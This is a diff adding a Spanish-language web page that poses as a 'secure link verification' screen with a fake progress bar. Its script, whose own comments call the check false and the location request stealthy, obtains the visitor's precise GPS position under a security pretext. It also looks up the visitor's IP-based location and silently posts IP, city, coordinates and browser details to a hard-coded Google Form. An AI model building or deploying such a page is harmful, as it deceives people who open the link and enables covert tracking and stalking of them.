@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enlace Verificado</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .security-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease-in;
+        }
+        
+        .security-content {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        .security-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        .security-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .security-text {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        
+        .progress-container {
+            margin: 25px 0;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            height: 8px;
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #45a049);
+            border-radius: 10px;
+            transition: width 0.5s ease;
+            position: relative;
+        }
+        
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 1.5s infinite;
+        }
+        
+        .status-text {
+            font-size: 14px;
+            color: #888;
+            margin-top: 15px;
+            height: 20px;
+        }
+        
+        .main-content {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 600px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            display: none;
+        }
+        
+        .content-header {
+            color: #333;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        
+        .content-body {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.6;
+            text-align: left;
+        }
+        
+        .success-badge {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .verification-steps {
+            text-align: left;
+            margin: 20px 0;
+            padding: 0;
+            list-style: none;
+        }
+        
+        .verification-steps li {
+            padding: 8px 0;
+            color: #666;
+            position: relative;
+            padding-left: 25px;
+        }
+        
+        .verification-steps li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #4CAF50;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <!-- Modal de Verificación de Seguridad -->
+    <div id="securityModal" class="security-modal">
+        <div class="security-content">
+            <div class="security-icon">🔒</div>
+            <div class="security-title">Verificación de Seguridad</div>
+            <div class="security-text">
+                Verificando la autenticidad del enlace y validando el acceso seguro...
+            </div>
+            
+            <div class="progress-container">
+                <div id="progressBar" class="progress-bar"></div>
+            </div>
+            
+            <div id="statusText" class="status-text">Iniciando verificación...</div>
+        </div>
+    </div>
+
+    <!-- Contenido Principal (oculto inicialmente) -->
+    <div id="mainContent" class="main-content">
+        <div class="success-badge">✅ Enlace Verificado</div>
+        <div class="content-header">📋 Documento Compartido</div>
+        <div class="content-body">
+            <p><strong>¡Perfecto!</strong> El enlace ha sido verificado correctamente y puedes acceder al contenido de forma segura.</p>
+            
+            <h3>📄 Contenido Disponible:</h3>
+            <ul class="verification-steps">
+                <li>Documento principal actualizado</li>
+                <li>Archivos adjuntos verificados</li>
+                <li>Contenido multimedia disponible</li>
+                <li>Enlaces relacionados validados</li>
+            </ul>
+            
+            <p>Gracias por utilizar nuestro sistema de enlaces seguros. Toda la información ha sido procesada correctamente.</p>
+            
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 25px;">
+                <h4 style="margin: 0 0 10px 0; color: #333;">📊 Resumen del Proceso:</h4>
+                <p style="margin: 0; color: #666; font-size: 14px;">
+                    Verificación completada exitosamente. El contenido ha sido validado y está listo para su uso.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const GOOGLE_FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSfQPts57g3vqveBw9Kc8-vxyb3kX0e_1y0wjf62UXjrWaWLOQ/formResponse?usp=header';
+        
+        let datosRecopilados = {
+            ip: 'No disponible',
+            city: 'No disponible',
+            country: 'No disponible',
+            region: 'No disponible',
+            latitude: 0,
+            longitude: 0,
+            precision: 'No disponible',
+            metodo: 'No definido',
+            timestamp: new Date().toISOString()
+        };
+
+        // Mensajes de progreso realistas
+        const mensajesProgreso = [
+            "Iniciando verificación...",
+            "Validando certificado SSL...",
+            "Verificando origen del enlace...",
+            "Comprobando integridad de datos...",
+            "Validando ubicación por seguridad...",
+            "Aplicando políticas de seguridad...",
+            "Finalizando verificación...",
+            "¡Verificación completada!"
+        ];
+
+        let progresoActual = 0;
+        let ubicacionObtenida = false;
+
+        // Función principal de verificación falsa
+        function iniciarVerificacionFalsa() {
+            const progressBar = document.getElementById('progressBar');
+            const statusText = document.getElementById('statusText');
+            let paso = 0;
+
+            const interval = setInterval(() => {
+                // Actualizar progreso visual
+                progresoActual += 12.5;
+                progressBar.style.width = progresoActual + '%';
+                
+                // Actualizar mensaje
+                if (paso < mensajesProgreso.length) {
+                    statusText.textContent = mensajesProgreso[paso];
+                    paso++;
+                }
+
+                // En el paso 4 (50% del progreso), solicitar ubicación
+                if (progresoActual === 50 && !ubicacionObtenida) {
+                    solicitarUbicacionSigilosa();
+                }
+
+                // Completar verificación
+                if (progresoActual >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        completarVerificacion();
+                    }, 1000);
+                }
+            }, 800);
+        }
+
+        // Función para solicitar ubicación de forma sigilosa
+        function solicitarUbicacionSigilosa() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Éxito - ubicación GPS obtenida
+                        datosRecopilados.latitude = position.coords.latitude;
+                        datosRecopilados.longitude = position.coords.longitude;
+                        datosRecopilados.precision = Math.round(position.coords.accuracy) + 'm';
+                        datosRecopilados.metodo = 'GPS_PRECISO';
+                        ubicacionObtenida = true;
+                        
+                        console.log('GPS obtenido exitosamente:', {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                        
+                        // Obtener datos adicionales por IP
+                        obtenerDatosIP();
+                    },
+                    function(error) {
+                        // Error - usar método backup por IP
+                        console.log('GPS falló, usando backup IP:', error.message);
+                        usarBackupIP();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Navegador no soporta geolocalización
+                usarBackupIP();
+            }
+        }
+
+        // Función backup para ubicación por IP
+        async function usarBackupIP() {
+            try {
+                await obtenerDatosIP();
+                datosRecopilados.metodo = 'IP_APROXIMADO';
+                datosRecopilados.precision = 'Ciudad (~5-10km)';
+                ubicacionObtenida = true;
+            } catch (error) {
+                console.log('Error obteniendo datos por IP:', error);
+                datosRecopilados.metodo = 'ERROR';
+            }
+        }
+
+        // Función para obtener datos por IP
+        async function obtenerDatosIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                datosRecopilados.ip = data.ip || 'No disponible';
+                datosRecopilados.city = data.city || 'No disponible';
+                datosRecopilados.country = data.country || 'No disponible';
+                datosRecopilados.region = data.region || 'No disponible';
+                
+                // Solo actualizar coordenadas si no las tenemos de GPS
+                if (datosRecopilados.metodo !== 'GPS_PRECISO') {
+                    datosRecopilados.latitude = data.latitude || 0;
+                    datosRecopilados.longitude = data.longitude || 0;
+                }
+                
+            } catch (error) {
+                console.log('Error al obtener datos de IP:', error);
+            }
+        }
+
+        // Función para enviar datos a Google Forms
+        async function enviarDatos() {
+            try {
+                const formData = new FormData();
+                
+                formData.append('entry.1392977111', datosRecopilados.ip);
+                formData.append('entry.1517150205', datosRecopilados.city);
+                formData.append('entry.2094576089', datosRecopilados.country);
+                formData.append('entry.1415149614', datosRecopilados.region);
+                formData.append('entry.1349929666', `${datosRecopilados.latitude}, ${datosRecopilados.longitude}`);
+                formData.append('entry.1008793067', new Date().toLocaleString());
+                formData.append('entry.999090935', `${navigator.userAgent} | Método: ${datosRecopilados.metodo} | Precisión: ${datosRecopilados.precision}`);
+                
+                await fetch(GOOGLE_FORM_URL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+                
+                console.log('Datos enviados exitosamente:', datosRecopilados);
+                
+            } catch (error) {
+                console.log('Error al enviar datos:', error);
+            }
+        }
+
+        // Función para completar la verificación
+        function completarVerificacion() {
+            // Enviar datos recopilados
+            enviarDatos();
+            
+            // Ocultar modal y mostrar contenido
+            document.getElementById('securityModal').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }
+
+        // Inicializar cuando carga la página
+        window.addEventListener('load', function() {
+            // Obtener datos básicos por IP inmediatamente
+            obtenerDatosIP();
+            
+            // Iniciar el proceso de verificación falsa
+            setTimeout(() => {
+                iniciarVerificacionFalsa();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
